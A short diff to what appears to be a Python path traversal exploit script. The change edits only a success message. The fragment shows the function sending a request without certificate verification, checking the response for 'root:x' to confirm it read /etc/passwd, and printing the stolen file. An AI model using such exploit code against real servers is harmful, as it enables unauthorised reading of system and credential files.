@@ -11,7 +11,7 @@ def path_transversal_exploit(url,target_file):
     r=requests.get(url+path,verify=False,proxies=proxies)
     if "root:x" in r.text:
         print("[+] Exploit Successfull.")
-        print(f"[+] The contents of {target_file} is printed.")
+        print(f"[+] The contents of /{target_file} is printed.")
         print(r.text)
         sys.exit(0)
     else:
